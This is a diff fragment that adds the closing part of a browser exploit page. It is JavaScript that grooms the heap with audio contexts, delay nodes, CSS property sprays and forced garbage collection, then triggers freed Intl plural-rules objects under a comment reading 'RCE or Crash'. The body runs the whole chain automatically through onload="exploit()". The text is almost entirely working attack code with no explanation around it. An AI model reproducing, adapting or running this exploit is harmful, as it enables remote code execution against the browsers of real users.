+      view.setBigUint64(0xc8, 0n, true);
+      view.setBigUint64(0xd8, 0n, true);
+      view.setBigUint64(0xf0, 1n, true);
+      view.setBigUint64(0x100, 0x3132333434333231n, true);
+      view.setBigUint64(0x1e0, 0n, true);
+
+      await initAudioContext((leak_size_1+3)*4);
+
+      for (let i=0; i<leak_size_1+1; i++) {
+        for (let j=i*4; j<(i+1)*4; j++) {
+          rs1.getPropertyValue(`--leak_2${j}`)
+          div1.style.removeProperty(`--leak_2${j}`)
+        }
+      }
+
+      gc(); gc(); await sleep(500);
+
+      // bp
+      let bp11 = new ArrayBuffer(0x600);
+
+      console.log("doing the delaynode")
+      await initDelayNodes(0x2000);
+      console.log("done the delaynode")
+ 
+      console.log("before allocAudioArray");
+      await allocAudioArray(ab);
+      console.log("After allocAudioArray");
+
+      // bp
+      let bp12 = new ArrayBuffer(0x600);
+
+      // reset refcounter
+      gc(); await sleep(500);
+
+      // bp
+      let bp13 = new ArrayBuffer(0x600);
+
+
+      for (let i=0; i<increase_refcount_to; i++) {
+        rs.getPropertyValue(`--sprayPINO${csstarget_pino[good_candidate_at]}`);
+      }
+
+      // bp
+      let bp14 = new ArrayBuffer(0x600);
+
+      // RCE or Crash
+      for (let i=N1_plural_rules; i<N2_plural_rules+80; i++) {
+        plural_rules[i].select(0);
+      }
+
+    }
+
+    </script> 
+  
+  </head>
+
+  <body onload="exploit()">
+ 
+  <span id="div0"></span>
+  <span id="div1"></span>
+  
+  <h1></h1>
+
+  </body>
 </html>
